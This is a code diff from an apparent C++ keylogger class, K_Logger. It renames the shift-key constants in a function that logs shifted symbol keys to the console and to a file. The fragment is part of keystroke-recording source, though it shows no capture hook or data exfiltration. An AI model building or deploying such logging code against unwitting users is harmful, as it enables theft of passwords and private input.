@@ -107,7 +107,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 54:
-			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
+			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "^";
 				WriteToFile("^");
@@ -120,7 +120,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 55:
-			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
+			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "&";
 				WriteToFile("&");
@@ -133,7 +133,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 56:
-			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
+			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "*";
 				WriteToFile("*");
@@ -146,7 +146,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 57:
-			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
+			if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 			{
 				std::cout << "(";
 				WriteToFile("(");
